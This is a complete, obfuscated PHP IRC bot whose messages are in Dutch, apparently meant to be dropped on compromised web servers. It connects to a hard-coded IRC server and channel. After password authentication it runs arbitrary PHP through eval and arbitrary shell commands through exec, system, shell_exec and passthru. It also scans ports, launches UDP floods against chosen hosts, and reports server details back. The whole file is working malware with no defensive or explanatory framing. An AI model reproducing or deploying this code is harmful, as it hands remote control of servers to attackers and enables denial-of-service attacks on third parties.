<?php set_time_limit(0); error_reporting(0);  class vVzVzRNFVVvjfJrZv {

 var $bNbjzFNVVZvjbjZ = array("jrfJbjjvjfFZNbRf"=>"abuse.moerenshop.nl",
                     "nRjj"=>"23232",
                     "fNfVJ"=>"scary",
                     "Bbnnvz"=>"13",
                     "PXPDD"=>"#wWw#",
                     "Nrb"=>"scan",
                     "RbZvBJBfZ"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "jfrJNnjJFB"=>".",
                     "zzbrJvrnVrF"=>"*");
                      var $JfJzJRbbFzRrvrVfFB = array(); 
 function uIyAmaqIaeiQY() 
 { 
    if(!($this->cKowSkGoG = fsockopen($this->bNbjzFNVVZvjbjZ['jrfJbjjvjfFZNbRf'],$this->bNbjzFNVVZvjbjZ['nRjj'],$e,$s,30))) 
    $this->uIyAmaqIaeiQY(); 
    $this->qQAAaMqqEuEUUiiuI();
    if(strlen($this->bNbjzFNVVZvjbjZ['fNfVJ'])>0) 
    $this->aiaqYIY("PASS ".$this->bNbjzFNVVZvjbjZ['fNfVJ']);
    $this->IAUQiymIaqiQImUQ();
    $this->IAYEIiuqiqAqYy();
 } function yuiIIEeYaAie($lTLH) 
 { 
    if(isset($this->JfJzJRbbFzRrvrVfFB[$lTLH])) 
       return 1; 
    else 
       return 0; 
 }function IAYEIiuqiqAqYy() 
 { 
    while(!feof($this->cKowSkGoG)) 
    { 
       $this->IqmMe = trim(fgets($this->cKowSkGoG,512)); 
       $JfnvRFBrrrRRR = explode(" ",$this->IqmMe); 
       if(substr($this->IqmMe,0,6)=="PING :") 
       { 
          $this->aiaqYIY("PONG :".substr($this->IqmMe,6)); 
       } 
       if(isset($JfnvRFBrrrRRR[1]) && $JfnvRFBrrrRRR[1] =="004") 
       { 
          $this->aiaqYIY("JOIN ".$this->bNbjzFNVVZvjbjZ['PXPDD']." ".$this->bNbjzFNVVZvjbjZ['Nrb']."");
          $this->uEYqQm($this->bNbjzFNVVZvjbjZ['PXPDD'],$this->bNbjzFNVVZvjbjZ['Nrb']);
          $this->MEAMeyEAuuUUEyyiMia();
       } 
       if(isset($JfnvRFBrrrRRR[1]) && $JfnvRFBrrrRRR[1]=="433") 
       { 
          $this->IAUQiymIaqiQImUQ(); 
       }
       if($this->IqmMe != $RVb_Hdl) 
       { 
          $FRfVzJNRfVzzFF = array(); 
          $gOw = substr(strstr($this->IqmMe," :"),2); 
          $CkcG = explode(" ",$gOw); 
          $OKKCg = explode("!",$JfnvRFBrrrRRR[0]); 
          $kwCKSG = explode("@",$OKKCg[1]); 
          $kwCKSG = $kwCKSG[1]; 
          $OKKCg = substr($OKKCg[0],1); 
          $sKwGOsO = $JfnvRFBrrrRRR[0]; 
          if($CkcG[0]==$this->OKKCg) 
          { 
           for($p=0;$p<count($CkcG);$p++) 
              $FRfVzJNRfVzzFF[$p] = $CkcG[$p+1]; 
          } 
          else 
          { 
           for($p=0;$p<count($CkcG);$p++) 
              $FRfVzJNRfVzzFF[$p] = $CkcG[$p]; 
          } 
          if(count($JfnvRFBrrrRRR)>2) 
          { 
             switch($JfnvRFBrrrRRR[1]) 
             { 
                case "QUIT": 
                   if($this->yuiIIEeYaAie($sKwGOsO)) 
                   { 
                      $this->qmuEiIiy($sKwGOsO); 
                   } 
                break; 
                case "PART": 
                   if($this->yuiIIEeYaAie($sKwGOsO)) 
                   { 
                      $this->qmuEiIiy($sKwGOsO); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->yuiIIEeYaAie($sKwGOsO) && (md5($kwCKSG) == $this->bNbjzFNVVZvjbjZ['zzbrJvrnVrF'] || $this->bNbjzFNVVZvjbjZ['zzbrJvrnVrF'] == "*")) 
                   { 
                      if(substr($FRfVzJNRfVzzFF[0],0,1)==$this->bNbjzFNVVZvjbjZ['jfrJNnjJFB']) 
                      { 
                         switch(substr($FRfVzJNRfVzzFF[0],1)) 
                         { 
                            case "user": 
                              if(md5($FRfVzJNRfVzzFF[1])==$this->bNbjzFNVVZvjbjZ['RbZvBJBfZ']) 
                              { 
                                 $this->YQqQUMiaa($sKwGOsO);
                              } 
                              else 
                              { 
                                 $this->meyyMqaAqq($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002Auth\002]: Fout password $OKKCg idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->yuiIIEeYaAie($sKwGOsO)) 
                   { 
                      if(substr($FRfVzJNRfVzzFF[0],0,1)==$this->bNbjzFNVVZvjbjZ['jfrJNnjJFB']) 
                      { 
                         switch(substr($FRfVzJNRfVzzFF[0],1)) 
                         {                            case "die": 
                               $this->aiaqYIY("QUIT :die command from $OKKCg");
                               fclose($this->cKowSkGoG); 
                               exit;                            case "info":
                               $this->MEAMeyEAuuUUEyyiMia();
                            break;                            case "eval":
                              $eval = eval(substr(strstr($gOw,$FRfVzJNRfVzzFF[1]),strlen($FRfVzJNRfVzzFF[1])));
                            break;                            case "logout": 
                               $this->qmuEiIiy($sKwGOsO); 
                               $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002Auth\002]\00314 Je bent nu uitgelogt $OKKCg"); 
                            break;                            case "sexec":
                               $WkGgSscKcsWk = substr(strstr($gOw,$FRfVzJNRfVzzFF[0]),strlen($FRfVzJNRfVzzFF[0])+1); 
                               $sGwcCsoKoCcGo = shell_exec($WkGgSscKcsWk); 
                               $KKGWsogOoCwsww = explode("\n",$sGwcCsoKoCcGo); 
                               for($p=0;$p<count($KKGWsogOoCwsww);$p++) 
                                  if($KKGWsogOoCwsww[$p]!=NULL) 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"      : ".trim($KKGWsogOoCwsww[$p])); 
                            break;                            case "dns": 
                               if(isset($FRfVzJNRfVzzFF[1])) 
                               { 
                                  $sG = explode(".",$FRfVzJNRfVzzFF[1]); 
                                  if(count($sG)==4 && is_numeric($sG[0]) && is_numeric($sG[1]) && is_numeric($sG[2]) && is_numeric($sG[3])) 
                                  { 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002dns\002]: ".$FRfVzJNRfVzzFF[1]." => ".gethostbyaddr($FRfVzJNRfVzzFF[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002dns\002]: ".$FRfVzJNRfVzzFF[1]." => ".gethostbyname($FRfVzJNRfVzzFF[1])); 
                                  } 
                               } 
                            break;                            case "passthru": 
                               $WkGgSscKcsWk = substr(strstr($gOw,$FRfVzJNRfVzzFF[0]),strlen($FRfVzJNRfVzzFF[0])+1); 

                               $sGwcCsoKoCcGo = passthru($WkGgSscKcsWk); 
                               $KKGWsogOoCwsww = explode("\n",$sGwcCsoKoCcGo); 
                               for($p=0;$p<count($KKGWsogOoCwsww);$p++) 
                                  if($KKGWsogOoCwsww[$p]!=NULL) 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"      : ".trim($KKGWsogOoCwsww[$p])); 
                            break;                            case "raw":
                               $this->aiaqYIY(strstr($gOw,$FRfVzJNRfVzzFF[1])); 
                            break;                            case "pscan": 
                               if(count($FRfVzJNRfVzzFF) > 2) 
                               { 
                                  if(fsockopen($FRfVzJNRfVzzFF[1],$FRfVzJNRfVzzFF[2],$e,$s,15)) 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002pscan\002]: ".$FRfVzJNRfVzzFF[1].":".$FRfVzJNRfVzzFF[2]." is \2open\2"); 
                                  else 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002pscan\002]: ".$FRfVzJNRfVzzFF[1].":".$FRfVzJNRfVzzFF[2]." is \2closed\2"); 
                               } 
                            break;                            case "exec": 
                               $WkGgSscKcsWk = substr(strstr($gOw,$FRfVzJNRfVzzFF[0]),strlen($FRfVzJNRfVzzFF[0])+1); 
                               $sGwcCsoKoCcGo = exec($WkGgSscKcsWk); 
                               $KKGWsogOoCwsww = explode("\n",$sGwcCsoKoCcGo); 
                               for($p=0;$p<count($KKGWsogOoCwsww);$p++) 
                                  if($KKGWsogOoCwsww[$p]!=NULL) 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"      : ".trim($KKGWsogOoCwsww[$p])); 
                            break;                            case "udpflood": 
                               if(count($FRfVzJNRfVzzFF)>3) 
                               { 
                                  $this->MamEimYmeamIQyUaQI($FRfVzJNRfVzzFF[1],$FRfVzJNRfVzzFF[2],$FRfVzJNRfVzzFF[3]); 
                               } 
                            break;                            case "system": 
                               $WkGgSscKcsWk = substr(strstr($gOw,$FRfVzJNRfVzzFF[0]),strlen($FRfVzJNRfVzzFF[0])+1); 
                               $sGwcCsoKoCcGo = system($WkGgSscKcsWk); 
                               $KKGWsogOoCwsww = explode("\n",$sGwcCsoKoCcGo); 
                               for($p=0;$p<count($KKGWsogOoCwsww);$p++) 
                                  if($KKGWsogOoCwsww[$p]!=NULL) 
                                     $this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"      : ".trim($KKGWsogOoCwsww[$p])); 
                            break;                            case "rndnick": 
                               $this->IAUQiymIaqiQImUQ(); 
                            break;                            case "restart": 
                               $this->aiaqYIY("QUIT :gerestart door $OKKCg");
                               fclose($this->cKowSkGoG); 
                               $this->uIyAmaqIaeiQY(); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $RVb_Hdl = $this->IqmMe; 
    } 
    $this->uIyAmaqIaeiQY(); 
 } function meyyMqaAqq($dD,$DPL)
 {
    $this->aiaqYIY("NOTICE $dD :$DPL");
 } function MEAMeyEAuuUUEyyiMia() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $lXxDtpDDtXL = "\0034ON\003"; } else { $lXxDtpDDtXL = "\0039OFF\003"; }

	$XLlDDdHx = php_uname();
	if($XLlDDdHx == "") { $nbOCLh = "\00315---\003"; } else { $nbOCLh = "\00315".$XLlDDdHx."\003"; }
		 
	 $ZJCc = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $TXwsW =  getcwd()."";
	 
	 $Hssc = "\00315".$TXwsW."\003";

	$GKWKwKWGgS = fileperms("$TXwsW");

	if (($GKWKwKWGgS & 0xC000) == 0xC000) { $gOKCoKOwKOo = 's';
	} elseif (($GKWKwKWGgS & 0xA000) == 0xA000) { $gOKCoKOwKOo = 'l';
	} elseif (($GKWKwKWGgS & 0x8000) == 0x8000) { $gOKCoKOwKOo = '-';
	} elseif (($GKWKwKWGgS & 0x6000) == 0x6000) { $gOKCoKOwKOo = 'b';
	} elseif (($GKWKwKWGgS & 0x4000) == 0x4000) { $gOKCoKOwKOo = 'd';
	} elseif (($GKWKwKWGgS & 0x2000) == 0x2000) { $gOKCoKOwKOo = 'c';
	} elseif (($GKWKwKWGgS & 0x1000) == 0x1000) { $gOKCoKOwKOo = 'p';
	} else { $gOKCoKOwKOo = 'u'; }

	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0100) ? 'r' : '-');
	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0080) ? 'w' : '-');
	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0040) ?	(($GKWKwKWGgS & 0x0800) ? 's' : 'x' ) :	(($GKWKwKWGgS & 0x0800) ? 'S' : '-'));

	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0020) ? 'r' : '-');
	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0010) ? 'w' : '-');
	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0008) ?	(($GKWKwKWGgS & 0x0400) ? 's' : 'x' ) :	(($GKWKwKWGgS & 0x0400) ? 'S' : '-'));

	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0004) ? 'r' : '-');
	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0002) ? 'w' : '-');
	$gOKCoKOwKOo .= (($GKWKwKWGgS & 0x0001) ?	(($GKWKwKWGgS & 0x0200) ? 't' : 'x' ) :	(($GKWKwKWGgS & 0x0200) ? 'T' : '-'));
			
	$zZLp = "\00315".$gOKCoKOwKOo."\003";

	$this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"\00314[SAFE:\003\002 $lXxDtpDDtXL\002\00314]\00315 $ZJCc \00314[pwd:]\00315 $Hssc \00314(\003$zZLp\00314) [uname:]\00315 $nbOCLh");
 } function qQAAaMqqEuEUUiiuI() {
  $hXxTTh = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $XdXdlTd = strlen($hXxTTh);
  for($p=0;$p<6;$p++) {
	$UEE .= $hXxTTh[rand(0,$XdXdlTd-1)];
  }
  if(php_uname() == "") { $XLlDDdHx = "---"; } else { $XLlDDdHx = php_uname(); }
  $this->aiaqYIY("USER ".$UEE." 127.0.0.1 localhost :".$XLlDDdHx."");
 } function MamEimYmeamIQyUaQI($lTLH,$LpHltdLxDT,$UQyy) {
	$this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002UdpFlood Gestart!\002]"); 
	$LDDXhTXhh = "";
	for($p=0;$p<$LpHltdLxDT;$p++) { $LDDXhTXhh .= chr(mt_rand(1,256)); }
	$dLHHp = time();
	$p = 0;
	while(time()-$dLHHp < $UQyy) {
		$Bt=fsockopen("udp://".$lTLH,mt_rand(0,6000),$e,$s,5);
      	fwrite($Bt,$LDDXhTXhh);
       	fclose($Bt);
		$p++;
	}
	$box = $p * $LpHltdLxDT;
	$box = $box / 1048576;
	$xbC = $box / $UQyy;
	$xbC = round($xbC);
	$box = round($box);
	$this->yMqQQYmyQyI($this->bNbjzFNVVZvjbjZ['PXPDD'],"[\002UdpFlood Afgerond!\002]: $box MB verzonden / gemiddelde: $xbC MB/s ");
 } function IAUQiymIaqiQImUQ() {
  $hXxTTh = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $XdXdlTd = strlen($hXxTTh);
  for($p=0;$p<$this->bNbjzFNVVZvjbjZ['Bbnnvz'];$p++) {
	$UEE .= $hXxTTh[rand(0,$XdXdlTd-1)];
  }
  $this->aiaqYIY("NICK ".$UEE."");
 } function YQqQUMiaa($lTLH) 
 { 
    $this->JfJzJRbbFzRrvrVfFB[$lTLH] = true; 
 } function aiaqYIY($DPL) 
 { 
    fwrite($this->cKowSkGoG,"$DPL\r\n"); 
 } function yMqQQYmyQyI($dD,$DPL)
 {
    $this->aiaqYIY("PRIVMSG $dD :$DPL");
 } function qmuEiIiy($lTLH) 
 { 
    unset($this->JfJzJRbbFzRrvrVfFB[$lTLH]); 
 } function uEYqQm($PXPDD,$Nrb=NULL) 
 { 
    $this->aiaqYIY("JOIN $PXPDD $Nrb"); 
 }}
$oOWSGgog = new vVzVzRNFVVvjfJrZv;
$oOWSGgog->uIyAmaqIaeiQY(); ?>